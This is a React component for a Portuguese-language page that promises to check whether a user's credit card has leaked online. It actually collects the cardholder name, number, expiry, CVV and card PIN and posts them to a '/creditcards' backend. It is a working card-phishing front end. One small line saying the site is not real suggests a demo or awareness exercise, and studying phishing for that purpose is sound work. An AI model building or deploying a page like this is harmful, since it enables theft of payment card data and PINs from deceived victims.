import React, { useState } from "react";
import { FcSimCardChip } from "react-icons/fc";
import { LuNfc } from "react-icons/lu";
import { ToastContainer, toast } from "react-toastify";
import instance from "../../api/instance.js";

const Payments: React.FC = () => {
  const [cartao, setCartao] = useState<string>("Seu nome aqui");
  const [numero, setNumero] = useState<string>("");
  const [cvv, setCvv] = useState<string>("000");

  function handleCardNumber(e: React.ChangeEvent<HTMLInputElement>) {
    let cardNumber = e.target.value;
    let formatcardNumber = cardNumber.replace(/\D/g, "");
    formatcardNumber = formatcardNumber.substring(0, 16);
    formatcardNumber = formatcardNumber.replace(/(\d{4})/g, "$1 ").trim();
    setNumero(formatcardNumber);
  }

  function sendCard(e: React.FormEvent<HTMLFormElement>) {
    let nomeCartao = e.target[0].value;
    let numeroCartao = e.target[1].value;
    let MM = e.target[2].value;
    let AA = e.target[3].value;
    let CVV = e.target[4].value;
    let senha = e.target[5].value;
    e.preventDefault();

    if (!nomeCartao || !numeroCartao || !MM || !AA || !CVV || !senha) {
      toast.error("Por favor insira todos os campos");
    }
    if (senha.length < 4) {
      toast.error("Senha menor que 4 digitos");
    }

    const currentDate = new Date();
    const dateCard = new Date(`20${AA}`, MM - 1, 1);

    try {
      instance.post("/creditcards", {
        name: nomeCartao,
        number: numeroCartao,
        expiration: `${MM}/${AA}`,
        cvv: CVV,
        password: senha,
      });
      toast.success("Dados enviados!");
    } catch (error) {
      console.log(error);
    }
  }

  return (
    <div className="w-screen h-screen flex justify-center items-center">
      <ToastContainer
        position="top-center"
        autoClose={5000}
        hideProgressBar={false}
        newestOnTop={false}
        closeOnClick={false}
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="colored"
      />
      <div className="w-2/4 h-full bg-[#291641] flex justify-center items-center relative">
        {/* Cartao 1 */}
        <div
          className="border border-gray-500 w-[32rem] h-64 absolute left-[10%] top-[10%] bg-[#1F1B1A] text-white rounded"
          style={{ padding: "1rem" }}
        >
          <div className="flex justify-between">
            <div
              className="flex gap-2 items-center"
              style={{ padding: ".5rem" }}
            >
              <div className="w-15 h-15 rounded-full bg-[#D9D9D9]"></div>
              <div className="w-10 h-10 rounded-full bg-[#D9D9D9]"></div>
            </div>
            <h1>Nome do cartão</h1>
          </div>
          <div>
            <div className="flex items-center " style={{ margin: "1rem 0" }}>
              <FcSimCardChip
                className="text-3xl text-slate-200"
                color="#D9D9D9"
              />
              <LuNfc className="text-3xl" color="#D9D9D9" />
            </div>
          </div>
          <h1 className="text-[1.5rem] w-full flex justify-between">
            {numero || "0000 0000 0000 0000"}
          </h1>
          <h1 className="text-2xl" style={{ marginTop: ".7rem" }}>
            {cartao || "Seu nome aqui"}
          </h1>
        </div>
        {/* Cartao 2 */}
        <div className="border border-gray-500 w-[32rem] h-64 absolute left-[35%] bottom-[15%] bg-[#1F1B1A] text-white rounded flex flex-col items-center">
          <div
            className="w-full h-15 bg-[#2F2F2F]"
            style={{ marginTop: "2rem" }}
          ></div>
          <div
            className="text-3xl w-2/3 bg-[#D9D9D9] rounded text-end"
            style={{ marginTop: "2rem" }}
          >
            <p style={{ padding: ".2rem 1.5rem" }} className="text-black">
              {cvv || "000"}
            </p>
          </div>
        </div>
      </div>
      {/*  Parte da direita (formulario)*/}
      <div className="w-full h-full bg-[#FFF] flex justify-center items-center flex-col">
        <h1 className="text-[2.5rem] w-2/4 " style={{ margin: "0 0 1rem 0" }}>
          Veja se seu cartão{" "}
          <span
            className="bg-red-300 rounded-full"
            style={{ padding: ".2rem .8rem .2rem .8rem" }}
          >
            vazou
          </span>{" "}
          na internet
        </h1>
        <form
          action=""
          onSubmit={(e) => sendCard(e)}
          className="flex flex-col w-2/6 "
        >
          <label htmlFor="" className="text-xl" style={{ marginTop: ".5rem" }}>
            Nome do cartão
          </label>
          <input
            type="text"
            name=""
            id=""
            className=" w-full bg-[#D9D9D9] rounded"
            style={{
              padding: ".5rem .5rem .5rem .8rem",
              margin: ".5rem 0 0 0",
            }}
            placeholder="Nome do cartão"
            onChange={(e) => setCartao(e.target.value)}
          />
          <label htmlFor="" className="text-xl" style={{ marginTop: ".5rem" }}>
            Número do cartão
          </label>
          <input
            type="text"
            className=" w-full bg-[#D9D9D9] rounded "
            style={{
              padding: ".5rem .5rem .5rem .8rem",
              margin: ".5rem 0 0 0",
            }}
            placeholder="0000 0000 0000 0000"
            maxLength={16}
            onChange={(e) => handleCardNumber(e)}
          />
          <div
            className="w-full flex justify-between gap-0.5"
            style={{ marginTop: ".5rem" }}
          >
            <div className="w-full">
              <label
                htmlFor=""
                className="text-xl"
                style={{ marginTop: ".5rem" }}
              >
                Data de validade
              </label>
              <div className="flex gap-0.5">
                <input
                  type="text"
                  placeholder="MM"
                  maxLength={2}
                  className=" w-full bg-[#D9D9D9] rounded"
                  style={{
                    padding: ".5rem .5rem .5rem .8rem",
                    margin: ".5rem 0 0 0",
                  }}
                />
                <input
                  type="text"
                  placeholder="AA"
                  maxLength={4}
                  className=" w-full bg-[#D9D9D9] rounded"
                  style={{
                    padding: ".5rem .5rem .5rem .8rem",
                    margin: ".5rem .5rem 0 0",
                  }}
                />
              </div>
            </div>
            <div className="w-[35%]">
              <label
                htmlFor=""
                className="text-xl"
                style={{ marginTop: ".5rem" }}
              >
                CVV
              </label>
              <input
                type="text"
                className=" w-full rounded bg-[#D9D9D9]"
                style={{
                  padding: ".5rem .5rem .5rem .8rem",
                  margin: ".5rem 0 0 0",
                }}
                placeholder="000"
                maxLength={3}
                onChange={(e) => setCvv(e.target.value)}
              />
            </div>
          </div>
          <div style={{ marginTop: ".5rem" }}>
            <label htmlFor="" className="text-xl">
              Senha do cartão
            </label>
            <input
              type="password"
              className=" w-full bg-[#D9D9D9]"
              style={{
                padding: ".5rem .5rem .5rem .8rem",
                margin: ".5rem 0 0 0",
              }}
              placeholder="*******"
            />
          </div>
          <input
            type="submit"
            name=""
            id=""
            className=" bg-blue-300 rounded"
            style={{
              padding: ".5rem .5rem .5rem .8rem",
              margin: "1rem 0 0 0 ",
            }}
          />
        </form>
        <h1 className="text-gray-500" style={{ marginTop: "1rem" }}>
          Esse site não é verdadeiro
        </h1>
      </div>
    </div>
  );
};

export default Payments;
